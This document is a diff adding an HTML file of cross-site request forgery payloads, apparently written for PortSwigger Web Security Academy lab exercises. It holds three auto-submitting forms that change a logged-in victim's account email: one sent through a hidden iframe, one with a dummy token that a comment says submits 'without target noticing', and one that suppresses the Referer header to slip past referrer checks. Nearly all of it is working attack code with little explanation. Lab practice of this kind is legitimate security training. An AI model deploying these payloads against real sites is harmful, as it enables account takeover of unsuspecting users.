@@ -1,0 +1,53 @@
+ <!-- no defenses? -->
+<!-- 
+<html>
+<body>
+
+    <h1>Hello World</h1>
+    <iframe style="display: none;" name="csrf-iframe"></iframe>
+    <form action="https://0ae50071034f57268096034d008c007d.web-security-academy.net/my-account/change-email" method="POST" target="csrf-iframe" id="csrf-form">
+        <input type="hidden" name="email" value="test20@test.com"/>
+    </form>
+
+    <script>document.getElementById("csrf-form").submit()</script>
+</body>
+
+</html> -->
+
+
+
+<!-- main code -->
+<html>
+  <body>
+    <script>history.pushState('', '', '/')</script>
+    <form action="Your url to the page to run this html script" method="POST">
+      <input type="hidden" name="email" value="test20@test.com">
+      <input type="hidden" name="csrf" value="anything">
+    </form>
+    <script>
+    //  submits the code without target noticing
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
+
+<!-- referrer removal -->
+ <html>
+  <header>
+     <meta name = "referrer" content="no-referrer">
+  </header>
+  <body>
+    <script>history.pushState('', '', '/')</script>
+    <form action="https://0a1a004b0335343f80f230320035004a.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="test20@test.com">
+      
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
+
+
